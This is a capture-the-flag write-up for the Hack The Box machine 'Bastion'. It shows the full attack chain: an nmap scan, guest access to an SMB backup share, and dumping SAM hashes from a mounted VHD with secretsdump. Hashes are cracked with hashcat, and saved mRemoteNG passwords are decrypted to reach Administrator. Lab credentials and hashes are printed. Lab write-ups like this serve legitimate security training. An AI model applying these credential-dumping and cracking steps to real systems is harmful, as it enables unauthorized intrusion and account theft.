# Bastion
> Silver Garcia | 18/04/2024

## Enumeration
Nmap
```bash
└─$ sudo nmap -T4 -A -p- 10.10.10.134                    
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 21:35 EDT
Nmap scan report for 10.10.10.134
Host is up (0.055s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/20%OT=22%CT=1%CU=41323%PV=Y%DS=2%DC=T%G=Y%TM=6624
OS:6DC8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%
OS:TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5
OS:=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W
OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -39m59s, deviation: 1h09m13s, median: -2s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-21T03:37:05+02:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-21T01:37:01
|_  start_date: 2024-04-21T00:44:59

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   54.92 ms 10.10.14.1
2   55.03 ms 10.10.10.134
```

List shares:
```
└──╼ [★]$ smbclient -L 10.10.10.134
Password for [WORKGROUP\thebionicarm]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Files on Backups share:
```
smb: \> ls
  .                                   D        0  Tue Apr 16 11:02:11 2019
  ..                                  D        0  Tue Apr 16 11:02:11 2019
  note.txt                           AR      116  Tue Apr 16 11:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 12:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 12:44:02 2019
``` 


note.txt
```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Mounted VHD file on the remote share using guestmount. For detailed steps: https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25

Got l4mpje credentials following next steps:
1. After getting access to the system files, extracted SAM and SYSTEM hives.
2. Used `secretsdump.py` to dump SAM databse:
```bash
└──╼ [★]$ secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::	
```
3. Used hashcat to crack L4mpje password
```bash
hashcat -a 0 -m 1000 l4mpje.txt /usr/share/wordlists/rockyou.txt 
```

Password:
```
26112010952d963c8dc4217daec986d9:bureaulampje
```

## Getting access

Got access through SSH using `l4mpje:bureaulampje` credentials.

## Privilege Escalation

Found `mRemoteNg` installed on `Progam Files (x86)` folder.
Realized that mRemoteNg config file password can be decrypted.
Followed next steps to get password:
1. Get `confCons.xml` file located in `C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml`
2. Download `mremoteng_decrypt.py` file
3. Decrypt passwords with script:
```
python3 mremoteng_decrypt.py confCons.xml 
Name: DC
Hostname: 127.0.0.1
Username: Administrator
Password: thXLHM96BeKL0ER2

Name: L4mpje-PC
Hostname: 192.168.1.75
Username: L4mpje
Password: bureaulampje
```

Could login as administrator through SSH using found credentials.
```
Username: Administrator
Password: thXLHM96BeKL0ER2
```